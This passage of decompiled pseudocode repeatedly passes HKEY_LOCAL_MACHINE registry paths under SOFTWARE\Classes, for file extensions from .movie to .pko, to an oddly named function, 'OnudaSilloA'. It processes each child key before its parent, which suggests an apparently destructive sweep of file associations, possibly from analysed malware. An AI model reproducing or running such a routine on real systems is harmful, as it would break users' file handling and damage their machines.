  loc_00451699: call var_A2C4 = global_00401054
  loc_004516A2: call var_A2C8 = global_004011CC
  loc_004516B8: call var_A2CC = global_00401188(var_24, "SOFTWARE\Classes\.movie\PersistentHandler")
  loc_004516C4: var_A2D0 = OnudaSilloA(global_80000002, var_A2CC)
  loc_004516C9: call var_A2D4 = global_00401054
  loc_004516D2: call var_A2D8 = global_004011CC
  loc_004516E8: call var_A2DC = global_00401188(var_24, "SOFTWARE\Classes\.movie")
  loc_004516F4: var_A2E0 = OnudaSilloA(global_80000002, var_A2DC)
  loc_004516F9: call var_A2E4 = global_00401054
  loc_00451702: call var_A2E8 = global_004011CC
  loc_00451718: call var_A2EC = global_00401188(var_24, "SOFTWARE\Classes\.mp2\OpenWithList\wmplayer.exe")
  loc_00451724: var_A2F0 = OnudaSilloA(global_80000002, var_A2EC)
  loc_00451729: call var_A2F4 = global_00401054
  loc_00451732: call var_A2F8 = global_004011CC
  loc_00451748: call var_A2FC = global_00401188(var_24, "SOFTWARE\Classes\.mp2\OpenWithList")
  loc_00451754: var_A300 = OnudaSilloA(global_80000002, var_A2FC)
  loc_00451759: call var_A304 = global_00401054
  loc_00451762: call var_A308 = global_004011CC
  loc_00451778: call var_A30C = global_00401188(var_24, "SOFTWARE\Classes\.mp2\OpenWithProgIds")
  loc_00451784: var_A310 = OnudaSilloA(global_80000002, var_A30C)
  loc_00451789: call var_A314 = global_00401054
  loc_00451792: call var_A318 = global_004011CC
  loc_004517A8: call var_A31C = global_00401188(var_24, "SOFTWARE\Classes\.mp2\PersistentHandler")
  loc_004517B4: var_A320 = OnudaSilloA(global_80000002, var_A31C)
  loc_004517B9: call var_A324 = global_00401054
  loc_004517C2: call var_A328 = global_004011CC
  loc_004517D8: call var_A32C = global_00401188(var_24, "SOFTWARE\Classes\.mp2")
  loc_004517E4: var_A330 = OnudaSilloA(global_80000002, var_A32C)
  loc_004517E9: call var_A334 = global_00401054
  loc_004517F2: call var_A338 = global_004011CC
  loc_00451808: call var_A33C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\PropertySheetHandlers")
  loc_00451814: var_A340 = OnudaSilloA(global_80000002, var_A33C)
  loc_00451819: call var_A344 = global_00401054
  loc_00451822: call var_A348 = global_004011CC
  loc_00451838: call var_A34C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex")
  loc_00451844: var_A350 = OnudaSilloA(global_80000002, var_A34C)
  loc_00451849: call var_A354 = global_00401054
  loc_00451852: call var_A358 = global_004011CC
  loc_00451868: call var_A35C = global_00401188(var_24, "SOFTWARE\Classes\*\OpenWithList\MSPaint.exe")
  loc_00451874: var_A360 = OnudaSilloA(global_80000002, var_A35C)
  loc_00451879: call var_A364 = global_00401054
  loc_00451882: call var_A368 = global_004011CC
  loc_00451898: call var_A36C = global_00401188(var_24, "SOFTWARE\Classes\*\OpenWithList")
  loc_004518A4: var_A370 = OnudaSilloA(global_80000002, var_A36C)
  loc_004518A9: call var_A374 = global_00401054
  loc_004518B2: call var_A378 = global_004011CC
  loc_004518C8: call var_A37C = global_00401188(var_24, "SOFTWARE\Classes\*")
  loc_004518D4: var_A380 = OnudaSilloA(global_80000002, var_A37C)
  loc_004518D9: call var_A384 = global_00401054
  loc_004518E2: call var_A388 = global_004011CC
  loc_004518F8: call var_A38C = global_00401188(var_24, "SOFTWARE\Classes\.mp2v\PersistentHandler")
  loc_00451904: var_A390 = OnudaSilloA(global_80000002, var_A38C)
  loc_00451909: call var_A394 = global_00401054
  loc_00451912: call var_A398 = global_004011CC
  loc_00451928: call var_A39C = global_00401188(var_24, "SOFTWARE\Classes\.mp2v\OpenWithProgIds")
  loc_00451934: var_A3A0 = OnudaSilloA(global_80000002, var_A39C)
  loc_00451939: call var_A3A4 = global_00401054
  loc_00451942: call var_A3A8 = global_004011CC
  loc_00451958: call var_A3AC = global_00401188(var_24, "SOFTWARE\Classes\.mp2v\OpenWithList\wmplayer.exe")
  loc_00451964: var_A3B0 = OnudaSilloA(global_80000002, var_A3AC)
  loc_00451969: call var_A3B4 = global_00401054
  loc_00451972: call var_A3B8 = global_004011CC
  loc_00451988: call var_A3BC = global_00401188(var_24, "SOFTWARE\Classes\.mp2v\OpenWithList")
  loc_00451994: var_A3C0 = OnudaSilloA(global_80000002, var_A3BC)
  loc_00451999: call var_A3C4 = global_00401054
  loc_004519A2: call var_A3C8 = global_004011CC
  loc_004519B8: call var_A3CC = global_00401188(var_24, "SOFTWARE\Classes\.mp2v")
  loc_004519C4: var_A3D0 = OnudaSilloA(global_80000002, var_A3CC)
  loc_004519C9: call var_A3D4 = global_00401054
  loc_004519D2: call var_A3D8 = global_004011CC
  loc_004519E8: call var_A3DC = global_00401188(var_24, "SOFTWARE\Classes\.mp3\PersistentHandler")
  loc_004519F4: var_A3E0 = OnudaSilloA(global_80000002, var_A3DC)
  loc_004519F9: call var_A3E4 = global_00401054
  loc_00451A02: call var_A3E8 = global_004011CC
  loc_00451A18: call var_A3EC = global_00401188(var_24, "SOFTWARE\Classes\.mp3\OpenWithProgIds")
  loc_00451A24: var_A3F0 = OnudaSilloA(global_80000002, var_A3EC)
  loc_00451A29: call var_A3F4 = global_00401054
  loc_00451A32: call var_A3F8 = global_004011CC
  loc_00451A48: call var_A3FC = global_00401188(var_24, "SOFTWARE\Classes\.mp3\OpenWithList\wmplayer.exe")
  loc_00451A54: var_A400 = OnudaSilloA(global_80000002, var_A3FC)
  loc_00451A59: call var_A404 = global_00401054
  loc_00451A62: call var_A408 = global_004011CC
  loc_00451A78: call var_A40C = global_00401188(var_24, "SOFTWARE\Classes\.mp3\OpenWithList")
  loc_00451A84: var_A410 = OnudaSilloA(global_80000002, var_A40C)
  loc_00451A89: call var_A414 = global_00401054
  loc_00451A92: call var_A418 = global_004011CC
  loc_00451AA8: call var_A41C = global_00401188(var_24, "SOFTWARE\Classes\.mp3")
  loc_00451AB4: var_A420 = OnudaSilloA(global_80000002, var_A41C)
  loc_00451AB9: call var_A424 = global_00401054
  loc_00451AC2: call var_A428 = global_004011CC
  loc_00451AD8: call var_A42C = global_00401188(var_24, "SOFTWARE\Classes\.mp4")
  loc_00451AE4: var_A430 = OnudaSilloA(global_80000002, var_A42C)
  loc_00451AE9: call var_A434 = global_00401054
  loc_00451AF2: call var_A438 = global_004011CC
  loc_00451B08: call var_A43C = global_00401188(var_24, "SOFTWARE\Classes\.mpa\PersistentHandler")
  loc_00451B14: var_A440 = OnudaSilloA(global_80000002, var_A43C)
  loc_00451B19: call var_A444 = global_00401054
  loc_00451B22: call var_A448 = global_004011CC
  loc_00451B38: call var_A44C = global_00401188(var_24, "SOFTWARE\Classes\.mpa\OpenWithProgIds")
  loc_00451B44: var_A450 = OnudaSilloA(global_80000002, var_A44C)
  loc_00451B49: call var_A454 = global_00401054
  loc_00451B52: call var_A458 = global_004011CC
  loc_00451B68: call var_A45C = global_00401188(var_24, "SOFTWARE\Classes\.mpa\OpenWithList\wmplayer.exe")
  loc_00451B74: var_A460 = OnudaSilloA(global_80000002, var_A45C)
  loc_00451B79: call var_A464 = global_00401054
  loc_00451B82: call var_A468 = global_004011CC
  loc_00451B98: call var_A46C = global_00401188(var_24, "SOFTWARE\Classes\.mpa\OpenWithList")
  loc_00451BA4: var_A470 = OnudaSilloA(global_80000002, var_A46C)
  loc_00451BA9: call var_A474 = global_00401054
  loc_00451BB2: call var_A478 = global_004011CC
  loc_00451BC8: call var_A47C = global_00401188(var_24, "SOFTWARE\Classes\.mpa")
  loc_00451BD4: var_A480 = OnudaSilloA(global_80000002, var_A47C)
  loc_00451BD9: call var_A484 = global_00401054
  loc_00451BE2: call var_A488 = global_004011CC
  loc_00451BF8: call var_A48C = global_00401188(var_24, "SOFTWARE\Classes\.mpc")
  loc_00451C04: var_A490 = OnudaSilloA(global_80000002, var_A48C)
  loc_00451C09: call var_A494 = global_00401054
  loc_00451C12: call var_A498 = global_004011CC
  loc_00451C28: call var_A49C = global_00401188(var_24, "SOFTWARE\Classes\.mpe\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}")
  loc_00451C34: var_A4A0 = OnudaSilloA(global_80000002, var_A49C)
  loc_00451C39: call var_A4A4 = global_00401054
  loc_00451C42: call var_A4A8 = global_004011CC
  loc_00451C58: call var_A4AC = global_00401188(var_24, "SOFTWARE\Classes\.mpe\ShellEx")
  loc_00451C64: var_A4B0 = OnudaSilloA(global_80000002, var_A4AC)
  loc_00451C69: call var_A4B4 = global_00401054
  loc_00451C72: call var_A4B8 = global_004011CC
  loc_00451C88: call var_A4BC = global_00401188(var_24, "SOFTWARE\Classes\.mpe\PersistentHandler")
  loc_00451C94: var_A4C0 = OnudaSilloA(global_80000002, var_A4BC)
  loc_00451C99: call var_A4C4 = global_00401054
  loc_00451CA2: call var_A4C8 = global_004011CC
  loc_00451CB8: call var_A4CC = global_00401188(var_24, "SOFTWARE\Classes\.mpe\OpenWithProgIds")
  loc_00451CC4: var_A4D0 = OnudaSilloA(global_80000002, var_A4CC)
  loc_00451CC9: call var_A4D4 = global_00401054
  loc_00451CD2: call var_A4D8 = global_004011CC
  loc_00451CE8: call var_A4DC = global_00401188(var_24, "SOFTWARE\Classes\.mpe\OpenWithList\wmplayer.exe")
  loc_00451CF4: var_A4E0 = OnudaSilloA(global_80000002, var_A4DC)
  loc_00451CF9: call var_A4E4 = global_00401054
  loc_00451D02: call var_A4E8 = global_004011CC
  loc_00451D18: call var_A4EC = global_00401188(var_24, "SOFTWARE\Classes\.mpe\OpenWithList")
  loc_00451D24: var_A4F0 = OnudaSilloA(global_80000002, var_A4EC)
  loc_00451D29: call var_A4F4 = global_00401054
  loc_00451D32: call var_A4F8 = global_004011CC
  loc_00451D48: call var_A4FC = global_00401188(var_24, "SOFTWARE\Classes\.mpe")
  loc_00451D54: var_A500 = OnudaSilloA(global_80000002, var_A4FC)
  loc_00451D59: call var_A504 = global_00401054
  loc_00451D62: call var_A508 = global_004011CC
  loc_00451D78: call var_A50C = global_00401188(var_24, "SOFTWARE\Classes\.mpeg\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}")
  loc_00451D84: var_A510 = OnudaSilloA(global_80000002, var_A50C)
  loc_00451D89: call var_A514 = global_00401054
  loc_00451D92: call var_A518 = global_004011CC
  loc_00451DA8: call var_A51C = global_00401188(var_24, "SOFTWARE\Classes\.mpeg\ShellEx")
  loc_00451DB4: var_A520 = OnudaSilloA(global_80000002, var_A51C)
  loc_00451DB9: call var_A524 = global_00401054
  loc_00451DC2: call var_A528 = global_004011CC
  loc_00451DD8: call var_A52C = global_00401188(var_24, "SOFTWARE\Classes\.mpeg\PersistentHandler")
  loc_00451DE4: var_A530 = OnudaSilloA(global_80000002, var_A52C)
  loc_00451DE9: call var_A534 = global_00401054
  loc_00451DF2: call var_A538 = global_004011CC
  loc_00451E08: call var_A53C = global_00401188(var_24, "SOFTWARE\Classes\.mpeg\OpenWithProgIds")
  loc_00451E14: var_A540 = OnudaSilloA(global_80000002, var_A53C)
  loc_00451E19: call var_A544 = global_00401054
  loc_00451E22: call var_A548 = global_004011CC
  loc_00451E38: call var_A54C = global_00401188(var_24, "SOFTWARE\Classes\.mpeg\OpenWithList\wmplayer.exe")
  loc_00451E44: var_A550 = OnudaSilloA(global_80000002, var_A54C)
  loc_00451E49: call var_A554 = global_00401054
  loc_00451E52: call var_A558 = global_004011CC
  loc_00451E68: call var_A55C = global_00401188(var_24, "SOFTWARE\Classes\.mpeg\OpenWithList")
  loc_00451E74: var_A560 = OnudaSilloA(global_80000002, var_A55C)
  loc_00451E79: call var_A564 = global_00401054
  loc_00451E82: call var_A568 = global_004011CC
  loc_00451E98: call var_A56C = global_00401188(var_24, "SOFTWARE\Classes\.mpeg")
  loc_00451EA4: var_A570 = OnudaSilloA(global_80000002, var_A56C)
  loc_00451EA9: call var_A574 = global_00401054
  loc_00451EB2: call var_A578 = global_004011CC
  loc_00451EC8: call var_A57C = global_00401188(var_24, "SOFTWARE\Classes\.mpg\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}")
  loc_00451ED4: var_A580 = OnudaSilloA(global_80000002, var_A57C)
  loc_00451ED9: call var_A584 = global_00401054
  loc_00451EE2: call var_A588 = global_004011CC
  loc_00451EF8: call var_A58C = global_00401188(var_24, "SOFTWARE\Classes\.mpg\ShellEx")
  loc_00451F04: var_A590 = OnudaSilloA(global_80000002, var_A58C)
  loc_00451F09: call var_A594 = global_00401054
  loc_00451F12: call var_A598 = global_004011CC
  loc_00451F28: call var_A59C = global_00401188(var_24, "SOFTWARE\Classes\.mpg\PersistentHandler")
  loc_00451F34: var_A5A0 = OnudaSilloA(global_80000002, var_A59C)
  loc_00451F39: call var_A5A4 = global_00401054
  loc_00451F42: call var_A5A8 = global_004011CC
  loc_00451F58: call var_A5AC = global_00401188(var_24, "SOFTWARE\Classes\.mpg\OpenWithProgIds")
  loc_00451F64: var_A5B0 = OnudaSilloA(global_80000002, var_A5AC)
  loc_00451F69: call var_A5B4 = global_00401054
  loc_00451F72: call var_A5B8 = global_004011CC
  loc_00451F88: call var_A5BC = global_00401188(var_24, "SOFTWARE\Classes\.mpg\OpenWithList\wmplayer.exe")
  loc_00451F94: var_A5C0 = OnudaSilloA(global_80000002, var_A5BC)
  loc_00451F99: call var_A5C4 = global_00401054
  loc_00451FA2: call var_A5C8 = global_004011CC
  loc_00451FB8: call var_A5CC = global_00401188(var_24, "SOFTWARE\Classes\.mpg\OpenWithList")
  loc_00451FC4: var_A5D0 = OnudaSilloA(global_80000002, var_A5CC)
  loc_00451FC9: call var_A5D4 = global_00401054
  loc_00451FD2: call var_A5D8 = global_004011CC
  loc_00451FE8: call var_A5DC = global_00401188(var_24, "SOFTWARE\Classes\.mpg")
  loc_00451FF4: var_A5E0 = OnudaSilloA(global_80000002, var_A5DC)
  loc_00451FF9: call var_A5E4 = global_00401054
  loc_00452002: call var_A5E8 = global_004011CC
  loc_00452018: call var_A5EC = global_00401188(var_24, "SOFTWARE\Classes\.mpv2\PersistentHandler")
  loc_00452024: var_A5F0 = OnudaSilloA(global_80000002, var_A5EC)
  loc_00452029: call var_A5F4 = global_00401054
  loc_00452032: call var_A5F8 = global_004011CC
  loc_00452048: call var_A5FC = global_00401188(var_24, "SOFTWARE\Classes\.mpv2\OpenWithProgIds")
  loc_00452054: var_A600 = OnudaSilloA(global_80000002, var_A5FC)
  loc_00452059: call var_A604 = global_00401054
  loc_00452062: call var_A608 = global_004011CC
  loc_00452078: call var_A60C = global_00401188(var_24, "SOFTWARE\Classes\.mpv2\OpenWithList\wmplayer.exe")
  loc_00452084: var_A610 = OnudaSilloA(global_80000002, var_A60C)
  loc_00452089: call var_A614 = global_00401054
  loc_00452092: call var_A618 = global_004011CC
  loc_004520A8: call var_A61C = global_00401188(var_24, "SOFTWARE\Classes\.mpv2\OpenWithList")
  loc_004520B4: var_A620 = OnudaSilloA(global_80000002, var_A61C)
  loc_004520B9: call var_A624 = global_00401054
  loc_004520C2: call var_A628 = global_004011CC
  loc_004520D8: call var_A62C = global_00401188(var_24, "SOFTWARE\Classes\.mpv2")
  loc_004520E4: var_A630 = OnudaSilloA(global_80000002, var_A62C)
  loc_004520E9: call var_A634 = global_00401054
  loc_004520F2: call var_A638 = global_004011CC
  loc_00452108: call var_A63C = global_00401188(var_24, "SOFTWARE\Classes\.msc")
  loc_00452114: var_A640 = OnudaSilloA(global_80000002, var_A63C)
  loc_00452119: call var_A644 = global_00401054
  loc_00452122: call var_A648 = global_004011CC
  loc_00452138: call var_A64C = global_00401188(var_24, "SOFTWARE\Classes\.msg\PersistentHandler")
  loc_00452144: var_A650 = OnudaSilloA(global_80000002, var_A64C)
  loc_00452149: call var_A654 = global_00401054
  loc_00452152: call var_A658 = global_004011CC
  loc_00452168: call var_A65C = global_00401188(var_24, "SOFTWARE\Classes\.msg")
  loc_00452174: var_A660 = OnudaSilloA(global_80000002, var_A65C)
  loc_00452179: call var_A664 = global_00401054
  loc_00452182: call var_A668 = global_004011CC
  loc_00452198: call var_A66C = global_00401188(var_24, "SOFTWARE\Classes\.msi")
  loc_004521A4: var_A670 = OnudaSilloA(global_80000002, var_A66C)
  loc_004521A9: call var_A674 = global_00401054
  loc_004521B2: call var_A678 = global_004011CC
  loc_004521C8: call var_A67C = global_00401188(var_24, "SOFTWARE\Classes\.msp")
  loc_004521D4: var_A680 = OnudaSilloA(global_80000002, var_A67C)
  loc_004521D9: call var_A684 = global_00401054
  loc_004521E2: call var_A688 = global_004011CC
  loc_004521F8: call var_A68C = global_00401188(var_24, "SOFTWARE\Classes\.MsRcIncident")
  loc_00452204: var_A690 = OnudaSilloA(global_80000002, var_A68C)
  loc_00452209: call var_A694 = global_00401054
  loc_00452212: call var_A698 = global_004011CC
  loc_00452228: call var_A69C = global_00401188(var_24, "SOFTWARE\Classes\.msstyles")
  loc_00452234: var_A6A0 = OnudaSilloA(global_80000002, var_A69C)
  loc_00452239: call var_A6A4 = global_00401054
  loc_00452242: call var_A6A8 = global_004011CC
  loc_00452258: call var_A6AC = global_00401188(var_24, "SOFTWARE\Classes\.MSWMM")
  loc_00452264: var_A6B0 = OnudaSilloA(global_80000002, var_A6AC)
  loc_00452269: call var_A6B4 = global_00401054
  loc_00452272: call var_A6B8 = global_004011CC
  loc_00452288: call var_A6BC = global_00401188(var_24, "SOFTWARE\Classes\.mv\PersistentHandler")
  loc_00452294: var_A6C0 = OnudaSilloA(global_80000002, var_A6BC)
  loc_00452299: call var_A6C4 = global_00401054
  loc_004522A2: call var_A6C8 = global_004011CC
  loc_004522B8: call var_A6CC = global_00401188(var_24, "SOFTWARE\Classes\.mv")
  loc_004522C4: var_A6D0 = OnudaSilloA(global_80000002, var_A6CC)
  loc_004522C9: call var_A6D4 = global_00401054
  loc_004522D2: call var_A6D8 = global_004011CC
  loc_004522E8: call var_A6DC = global_00401188(var_24, "SOFTWARE\Classes\.mydocs\PersistentHandler")
  loc_004522F4: var_A6E0 = OnudaSilloA(global_80000002, var_A6DC)
  loc_004522F9: call var_A6E4 = global_00401054
  loc_00452302: call var_A6E8 = global_004011CC
  loc_00452318: call var_A6EC = global_00401188(var_24, "SOFTWARE\Classes\.mydocs")
  loc_00452324: var_A6F0 = OnudaSilloA(global_80000002, var_A6EC)
  loc_00452329: call var_A6F4 = global_00401054
  loc_00452332: call var_A6F8 = global_004011CC
  loc_00452348: call var_A6FC = global_00401188(var_24, "SOFTWARE\Classes\.ncb\PersistentHandler")
  loc_00452354: var_A700 = OnudaSilloA(global_80000002, var_A6FC)
  loc_00452359: call var_A704 = global_00401054
  loc_00452362: call var_A708 = global_004011CC
  loc_00452378: call var_A70C = global_00401188(var_24, "SOFTWARE\Classes\.ncb")
  loc_00452384: var_A710 = OnudaSilloA(global_80000002, var_A70C)
  loc_00452389: call var_A714 = global_00401054
  loc_00452392: call var_A718 = global_004011CC
  loc_004523A8: call var_A71C = global_00401188(var_24, "SOFTWARE\Classes\.nfo")
  loc_004523B4: var_A720 = OnudaSilloA(global_80000002, var_A71C)
  loc_004523B9: call var_A724 = global_00401054
  loc_004523C2: call var_A728 = global_004011CC
  loc_004523D8: call var_A72C = global_00401188(var_24, "SOFTWARE\Classes\.nls")
  loc_004523E4: var_A730 = OnudaSilloA(global_80000002, var_A72C)
  loc_004523E9: call var_A734 = global_00401054
  loc_004523F2: call var_A738 = global_004011CC
  loc_00452408: call var_A73C = global_00401188(var_24, "SOFTWARE\Classes\.NMW")
  loc_00452414: var_A740 = OnudaSilloA(global_80000002, var_A73C)
  loc_00452419: call var_A744 = global_00401054
  loc_00452422: call var_A748 = global_004011CC
  loc_00452438: call var_A74C = global_00401188(var_24, "SOFTWARE\Classes\.nsc\DefaultIcon")
  loc_00452444: var_A750 = OnudaSilloA(global_80000002, var_A74C)
  loc_00452449: call var_A754 = global_00401054
  loc_00452452: call var_A758 = global_004011CC
  loc_00452468: call var_A75C = global_00401188(var_24, "SOFTWARE\Classes\.nsc")
  loc_00452474: var_A760 = OnudaSilloA(global_80000002, var_A75C)
  loc_00452479: call var_A764 = global_00401054
  loc_00452482: call var_A768 = global_004011CC
  loc_00452498: call var_A76C = global_00401188(var_24, "SOFTWARE\Classes\.nvr")
  loc_004524A4: var_A770 = OnudaSilloA(global_80000002, var_A76C)
  loc_004524A9: call var_A774 = global_00401054
  loc_004524B2: call var_A778 = global_004011CC
  loc_004524C8: call var_A77C = global_00401188(var_24, "SOFTWARE\Classes\.nws")
  loc_004524D4: var_A780 = OnudaSilloA(global_80000002, var_A77C)
  loc_004524D9: call var_A784 = global_00401054
  loc_004524E2: call var_A788 = global_004011CC
  loc_004524F8: call var_A78C = global_00401188(var_24, "SOFTWARE\Classes\.obj\PersistentHandler")
  loc_00452504: var_A790 = OnudaSilloA(global_80000002, var_A78C)
  loc_00452509: call var_A794 = global_00401054
  loc_00452512: call var_A798 = global_004011CC
  loc_00452528: call var_A79C = global_00401188(var_24, "SOFTWARE\Classes\.obj")
  loc_00452534: var_A7A0 = OnudaSilloA(global_80000002, var_A79C)
  loc_00452539: call var_A7A4 = global_00401054
  loc_00452542: call var_A7A8 = global_004011CC
  loc_00452558: call var_A7AC = global_00401188(var_24, "SOFTWARE\Classes\.oc_\PersistentHandler")
  loc_00452564: var_A7B0 = OnudaSilloA(global_80000002, var_A7AC)
  loc_00452569: call var_A7B4 = global_00401054
  loc_00452572: call var_A7B8 = global_004011CC
  loc_00452588: call var_A7BC = global_00401188(var_24, "SOFTWARE\Classes\.oc_")
  loc_00452594: var_A7C0 = OnudaSilloA(global_80000002, var_A7BC)
  loc_00452599: call var_A7C4 = global_00401054
  loc_004525A2: call var_A7C8 = global_004011CC
  loc_004525B8: call var_A7CC = global_00401188(var_24, "SOFTWARE\Classes\.oca")
  loc_004525C4: var_A7D0 = OnudaSilloA(global_80000002, var_A7CC)
  loc_004525C9: call var_A7D4 = global_00401054
  loc_004525D2: call var_A7D8 = global_004011CC
  loc_004525E8: call var_A7DC = global_00401188(var_24, "SOFTWARE\Classes\.ocx\PersistentHandler")
  loc_004525F4: var_A7E0 = OnudaSilloA(global_80000002, var_A7DC)
  loc_004525F9: call var_A7E4 = global_00401054
  loc_00452602: call var_A7E8 = global_004011CC
  loc_00452618: call var_A7EC = global_00401188(var_24, "SOFTWARE\Classes\.ocx")
  loc_00452624: var_A7F0 = OnudaSilloA(global_80000002, var_A7EC)
  loc_00452629: call var_A7F4 = global_00401054
  loc_00452632: call var_A7F8 = global_004011CC
  loc_00452648: call var_A7FC = global_00401188(var_24, "SOFTWARE\Classes\.odc\PersistentHandler")
  loc_00452654: var_A800 = OnudaSilloA(global_80000002, var_A7FC)
  loc_00452659: call var_A804 = global_00401054
  loc_00452662: call var_A808 = global_004011CC
  loc_00452678: call var_A80C = global_00401188(var_24, "SOFTWARE\Classes\.odc")
  loc_00452684: var_A810 = OnudaSilloA(global_80000002, var_A80C)
  loc_00452689: call var_A814 = global_00401054
  loc_00452692: call var_A818 = global_004011CC
  loc_004526A8: call var_A81C = global_00401188(var_24, "SOFTWARE\Classes\.ogg")
  loc_004526B4: var_A820 = OnudaSilloA(global_80000002, var_A81C)
  loc_004526B9: call var_A824 = global_00401054
  loc_004526C2: call var_A828 = global_004011CC
  loc_004526D8: call var_A82C = global_00401188(var_24, "SOFTWARE\Classes\.ogm")
  loc_004526E4: var_A830 = OnudaSilloA(global_80000002, var_A82C)
  loc_004526E9: call var_A834 = global_00401054
  loc_004526F2: call var_A838 = global_004011CC
  loc_00452708: call var_A83C = global_00401188(var_24, "SOFTWARE\Classes\.otf")
  loc_00452714: var_A840 = OnudaSilloA(global_80000002, var_A83C)
  loc_00452719: call var_A844 = global_00401054
  loc_00452722: call var_A848 = global_004011CC
  loc_00452738: call var_A84C = global_00401188(var_24, "SOFTWARE\Classes\.p10")
  loc_00452744: var_A850 = OnudaSilloA(global_80000002, var_A84C)
  loc_00452749: call var_A854 = global_00401054
  loc_00452752: call var_A858 = global_004011CC
  loc_00452768: call var_A85C = global_00401188(var_24, "SOFTWARE\Classes\.p12")
  loc_00452774: var_A860 = OnudaSilloA(global_80000002, var_A85C)
  loc_00452779: call var_A864 = global_00401054
  loc_00452782: call var_A868 = global_004011CC
  loc_00452798: call var_A86C = global_00401188(var_24, "SOFTWARE\Classes\.p7b")
  loc_004527A4: var_A870 = OnudaSilloA(global_80000002, var_A86C)
  loc_004527A9: call var_A874 = global_00401054
  loc_004527B2: call var_A878 = global_004011CC
  loc_004527C8: call var_A87C = global_00401188(var_24, "SOFTWARE\Classes\.p7c")
  loc_004527D4: var_A880 = OnudaSilloA(global_80000002, var_A87C)
  loc_004527D9: call var_A884 = global_00401054
  loc_004527E2: call var_A888 = global_004011CC
  loc_004527F8: call var_A88C = global_00401188(var_24, "SOFTWARE\Classes\.p7m")
  loc_00452804: var_A890 = OnudaSilloA(global_80000002, var_A88C)
  loc_00452809: call var_A894 = global_00401054
  loc_00452812: call var_A898 = global_004011CC
  loc_00452828: call var_A89C = global_00401188(var_24, "SOFTWARE\Classes\.p7r")
  loc_00452834: var_A8A0 = OnudaSilloA(global_80000002, var_A89C)
  loc_00452839: call var_A8A4 = global_00401054
  loc_00452842: call var_A8A8 = global_004011CC
  loc_00452858: call var_A8AC = global_00401188(var_24, "SOFTWARE\Classes\.p7s")
  loc_00452864: var_A8B0 = OnudaSilloA(global_80000002, var_A8AC)
  loc_00452869: call var_A8B4 = global_00401054
  loc_00452872: call var_A8B8 = global_004011CC
  loc_00452888: call var_A8BC = global_00401188(var_24, "SOFTWARE\Classes\.pag")
  loc_00452894: var_A8C0 = OnudaSilloA(global_80000002, var_A8BC)
  loc_00452899: call var_A8C4 = global_00401054
  loc_004528A2: call var_A8C8 = global_004011CC
  loc_004528B8: call var_A8CC = global_00401188(var_24, "SOFTWARE\Classes\.pas")
  loc_004528C4: var_A8D0 = OnudaSilloA(global_80000002, var_A8CC)
  loc_004528C9: call var_A8D4 = global_00401054
  loc_004528D2: call var_A8D8 = global_004011CC
  loc_004528E8: call var_A8DC = global_00401188(var_24, "SOFTWARE\Classes\.pbk")
  loc_004528F4: var_A8E0 = OnudaSilloA(global_80000002, var_A8DC)
  loc_004528F9: call var_A8E4 = global_00401054
  loc_00452902: call var_A8E8 = global_004011CC
  loc_00452918: call var_A8EC = global_00401188(var_24, "SOFTWARE\Classes\.pch\PersistentHandler")
  loc_00452924: var_A8F0 = OnudaSilloA(global_80000002, var_A8EC)
  loc_00452929: call var_A8F4 = global_00401054
  loc_00452932: call var_A8F8 = global_004011CC
  loc_00452948: call var_A8FC = global_00401188(var_24, "SOFTWARE\Classes\.pch")
  loc_00452954: var_A900 = OnudaSilloA(global_80000002, var_A8FC)
  loc_00452959: call var_A904 = global_00401054
  loc_00452962: call var_A908 = global_004011CC
  loc_00452978: call var_A90C = global_00401188(var_24, "SOFTWARE\Classes\.pdb\PersistentHandler")
  loc_00452984: var_A910 = OnudaSilloA(global_80000002, var_A90C)
  loc_00452989: call var_A914 = global_00401054
  loc_00452992: call var_A918 = global_004011CC
  loc_004529A8: call var_A91C = global_00401188(var_24, "SOFTWARE\Classes\.pdb")
  loc_004529B4: var_A920 = OnudaSilloA(global_80000002, var_A91C)
  loc_004529B9: call var_A924 = global_00401054
  loc_004529C2: call var_A928 = global_004011CC
  loc_004529D8: call var_A92C = global_00401188(var_24, "SOFTWARE\Classes\.pds\PersistentHandler")
  loc_004529E4: var_A930 = OnudaSilloA(global_80000002, var_A92C)
  loc_004529E9: call var_A934 = global_00401054
  loc_004529F2: call var_A938 = global_004011CC
  loc_00452A08: call var_A93C = global_00401188(var_24, "SOFTWARE\Classes\.pds")
  loc_00452A14: var_A940 = OnudaSilloA(global_80000002, var_A93C)
  loc_00452A19: call var_A944 = global_00401054
  loc_00452A22: call var_A948 = global_004011CC
  loc_00452A38: call var_A94C = global_00401188(var_24, "SOFTWARE\Classes\.pfm")
  loc_00452A44: var_A950 = OnudaSilloA(global_80000002, var_A94C)
  loc_00452A49: call var_A954 = global_00401054
  loc_00452A52: call var_A958 = global_004011CC
  loc_00452A68: call var_A95C = global_00401188(var_24, "SOFTWARE\Classes\.pfx")
  loc_00452A74: var_A960 = OnudaSilloA(global_80000002, var_A95C)
  loc_00452A79: call var_A964 = global_00401054
  loc_00452A82: call var_A968 = global_004011CC
  loc_00452A98: call var_A96C = global_00401188(var_24, "SOFTWARE\Classes\.pgx")
  loc_00452AA4: var_A970 = OnudaSilloA(global_80000002, var_A96C)
  loc_00452AA9: call var_A974 = global_00401054
  loc_00452AB2: call var_A978 = global_004011CC
  loc_00452AC8: call var_A97C = global_00401188(var_24, "SOFTWARE\Classes\.php3")
  loc_00452AD4: var_A980 = OnudaSilloA(global_80000002, var_A97C)
  loc_00452AD9: call var_A984 = global_00401054
  loc_00452AE2: call var_A988 = global_004011CC
  loc_00452AF8: call var_A98C = global_00401188(var_24, "SOFTWARE\Classes\.pic\PersistentHandler")
  loc_00452B04: var_A990 = OnudaSilloA(global_80000002, var_A98C)
  loc_00452B09: call var_A994 = global_00401054
  loc_00452B12: call var_A998 = global_004011CC
  loc_00452B28: call var_A99C = global_00401188(var_24, "SOFTWARE\Classes\.pic")
  loc_00452B34: var_A9A0 = OnudaSilloA(global_80000002, var_A99C)
  loc_00452B39: call var_A9A4 = global_00401054
  loc_00452B42: call var_A9A8 = global_004011CC
  loc_00452B58: call var_A9AC = global_00401188(var_24, "SOFTWARE\Classes\.pif")
  loc_00452B64: var_A9B0 = OnudaSilloA(global_80000002, var_A9AC)
  loc_00452B69: call var_A9B4 = global_00401054
  loc_00452B72: call var_A9B8 = global_004011CC
  loc_00452B88: call var_A9BC = global_00401188(var_24, "SOFTWARE\Classes\.pko")
